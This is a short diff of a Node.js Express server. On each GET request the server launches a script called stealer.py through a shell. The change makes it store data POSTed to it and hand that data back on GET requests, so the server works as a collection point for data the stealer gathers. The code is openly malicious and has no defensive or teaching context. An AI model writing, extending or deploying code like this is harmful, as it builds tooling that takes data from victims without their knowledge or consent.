@@ -14,14 +14,20 @@ app.listen(port, hostname, () => {
   console.log(`Server running at http://${hostname}:${port}/`);
 });
 
+let eo = []
+
 app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
   spawn("python ./stealer.py", { shell: true });
-  res.send({uo:"pillado huron"})
+  if(eo.length > 0){
+    res.send({uo:eo})
+  }else{
+    res.send({uo:"pillado huron"})
+  }
 })
 
 app.post('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
-  console.log(req.body.data)
+  eo.push(req.body.data)
 })
 
